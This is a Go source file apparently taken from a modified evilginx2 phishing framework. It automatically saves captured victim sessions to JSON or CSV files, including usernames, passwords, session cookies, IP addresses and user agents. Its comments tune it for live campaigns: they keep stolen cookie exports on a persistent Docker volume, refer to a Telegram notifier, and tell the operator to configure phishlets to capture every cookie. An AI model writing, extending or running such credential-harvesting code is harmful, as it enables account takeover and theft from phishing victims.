package core

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// AutoExportConfig holds configuration for automatic session export
type AutoExportConfig struct {
	Enabled bool   `json:"enabled"`
	Format  string `json:"format"` // "json" or "csv"
	Path    string `json:"path"`
	PerFile bool   `json:"per_file"` // true = one file per session, false = append to one file
}

var (
	autoExportCfg  *AutoExportConfig
	autoExportOnce sync.Once
	autoExportMu   sync.Mutex
)

// defaultAutoExportPath returns a PERSISTENT location: inside the evilginx
// home directory (~/.evilginx/exports), which is the ./data volume in
// Docker. Exports therefore survive container rebuilds. The old default
// (the container's temp directory) wiped every exported file on rebuild,
// which looked like lost or "incomplete" cookie exports.
func defaultAutoExportPath() string {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		return filepath.Join(os.TempDir(), "evilginx_exports")
	}
	return filepath.Join(home, ".evilginx", "exports")
}

// GetAutoExportConfig returns the singleton auto-export config
func GetAutoExportConfig() *AutoExportConfig {
	autoExportOnce.Do(func() {
		autoExportCfg = &AutoExportConfig{
			Enabled: false,
			Format:  "json",
			Path:    defaultAutoExportPath(),
			PerFile: true,
		}
	})
	return autoExportCfg
}

// SetAutoExportConfig sets the auto-export configuration
func SetAutoExportConfig(cfg *AutoExportConfig) {
	autoExportMu.Lock()
	defer autoExportMu.Unlock()
	autoExportCfg = cfg
}

// countSessionTokens counts how many cookies are stored inside a TSession's
// Tokens map (values are per-domain maps: domain -> cookie name -> value).
func countSessionTokens(session TSession) int {
	total := 0
	if session.Tokens == nil {
		return total
	}
	for _, domainTokens := range session.Tokens {
		if m, ok := domainTokens.(map[string]interface{}); ok {
			total += len(m)
		} else {
			total++
		}
	}
	return total
}

// AutoExportSession exports a session to a file automatically.
// It uses the same TSession it is handed (typically built by the Telegram
// notifier), so the export always carries the full in-memory cookie set.
func AutoExportSession(session TSession) error {
	// Take a consistent snapshot of the config under the lock, then keep
	// holding the lock for the whole export so two concurrent exports can
	// never interleave writes into the same file.
	autoExportMu.Lock()
	cfg := *GetAutoExportConfig()
	defer autoExportMu.Unlock()

	if !cfg.Enabled {
		return nil
	}

	// Create export directory if it doesn't exist
	if err := os.MkdirAll(cfg.Path, 0700); err != nil {
		return fmt.Errorf("autoexport: failed to create directory: %v", err)
	}

	tokens := countSessionTokens(session)

	timestamp := time.Now().Format("20060102_150405")
	phishlet := session.Phishlet
	if phishlet == "" {
		phishlet = "unknown"
	}

	switch cfg.Format {
	case "json":
		var filename string
		if cfg.PerFile {
			filename = filepath.Join(cfg.Path, fmt.Sprintf("%s_%s_%d.json", phishlet, timestamp, session.ID))
		} else {
			filename = filepath.Join(cfg.Path, fmt.Sprintf("%s_exports.json", phishlet))
		}

		if cfg.PerFile {
			data, err := json.MarshalIndent(session, "", "  ")
			if err != nil {
				return fmt.Errorf("autoexport: failed to marshal session: %v", err)
			}
			if err := os.WriteFile(filename, data, 0600); err != nil {
				return fmt.Errorf("autoexport: failed to write file: %v", err)
			}
		} else {
			// Append to a JSON array
			var sessions []TSession
			if existing, err := os.ReadFile(filename); err == nil {
				if len(existing) > 0 {
					if err := json.Unmarshal(existing, &sessions); err != nil {
						// Corrupt or non-array file: start fresh rather than
						// silently keeping a broken export.
						log.Warning("autoexport: existing export file %s is not valid JSON, starting fresh: %v", filename, err)
						sessions = nil
					}
				}
			}
			sessions = append(sessions, session)
			data, err := json.MarshalIndent(sessions, "", "  ")
			if err != nil {
				return fmt.Errorf("autoexport: failed to marshal sessions: %v", err)
			}
			if err := os.WriteFile(filename, data, 0600); err != nil {
				return fmt.Errorf("autoexport: failed to write file: %v", err)
			}
		}
		log.Info("autoexport: exported session #%d (%d cookies) to %s", session.ID, tokens, filename)
		if tokens == 0 {
			log.Warning("autoexport: session #%d exported with ZERO cookies - check that phishlet '%s' declares auth_tokens with keys '.*' and always: true", session.ID, phishlet)
		}

	case "csv":
		var filename string
		if cfg.PerFile {
			filename = filepath.Join(cfg.Path, fmt.Sprintf("%s_%s_%d.csv", phishlet, timestamp, session.ID))
		} else {
			filename = filepath.Join(cfg.Path, "sessions_export.csv")
		}

		file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
		if err != nil {
			return fmt.Errorf("autoexport: failed to open file: %v", err)
		}
		defer file.Close()

		writer := csv.NewWriter(file)

		// Write header if file is new (Stat error is now handled:
		// the old version could panic here with a nil Stat)
		stat, err := file.Stat()
		if err != nil {
			writer.Flush()
			return fmt.Errorf("autoexport: failed to stat file: %v", err)
		}
		if stat.Size() == 0 {
			if err := writer.Write([]string{"ID", "Phishlet", "Username", "Password", "LandingURL", "UserAgent", "RemoteAddr", "CookieCount", "CreateTime", "UpdateTime"}); err != nil {
				return fmt.Errorf("autoexport: failed to write header: %v", err)
			}
		}

		if err := writer.Write([]string{
			fmt.Sprintf("%d", session.ID),
			session.Phishlet,
			session.Username,
			session.Password,
			session.LandingURL,
			session.UserAgent,
			session.RemoteAddr,
			fmt.Sprintf("%d", tokens),
			fmt.Sprintf("%d", session.CreateTime),
			fmt.Sprintf("%d", session.UpdateTime),
		}); err != nil {
			return fmt.Errorf("autoexport: failed to write row: %v", err)
		}

		writer.Flush()
		if err := writer.Error(); err != nil {
			return fmt.Errorf("autoexport: csv write failed: %v", err)
		}
		log.Info("autoexport: exported session #%d (%d cookies) to %s", session.ID, tokens, filename)
		if tokens == 0 {
			log.Warning("autoexport: session #%d exported with ZERO cookies - check that phishlet '%s' declares auth_tokens with keys '.*' and always: true", session.ID, phishlet)
		}

	default:
		return fmt.Errorf("autoexport: unknown format '%s' (use json or csv)", cfg.Format)
	}

	return nil
}
